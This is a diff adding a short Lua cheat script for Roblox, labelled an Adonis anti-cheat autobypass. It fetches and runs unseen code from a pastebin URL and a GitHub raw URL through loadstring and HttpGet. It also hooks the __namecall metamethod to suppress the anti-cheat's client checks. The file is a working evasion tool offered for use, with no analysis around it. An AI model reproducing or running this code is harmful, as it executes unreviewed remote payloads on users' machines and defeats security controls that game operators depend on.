@@ -1,0 +1,18 @@
+Events = true -- Allow RemoteEvents (if true, blocks if false)
+Requests = false -- Allow RemoteFunctions (if true, blocks if false)
+Hitbox = true -- Allow Normal Hitbox (if true, attempt to bypass hbe if false)
+loadstring(game:HttpGet("https://pastebin.com/raw/MZrwt5Rm", true))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Dizzysky1/dick3j8e3qiadeinjadiojadmkadwa/main/dddddd'))()
+local Namecall
+Namecall = hookmetamethod(game, '__namecall', function(self, ...)
+   local Caller = tostring(getcallingscript())
+   local Method = getnamecallmethod()
+   
+   if Caller == 'ClientMover' and Method == 'GetService' then
+       return
+   end
+   
+   return Namecall(self, ...)
+end)
+
+warn('[Adonis Autobypass]: this game is running with autobypass!')
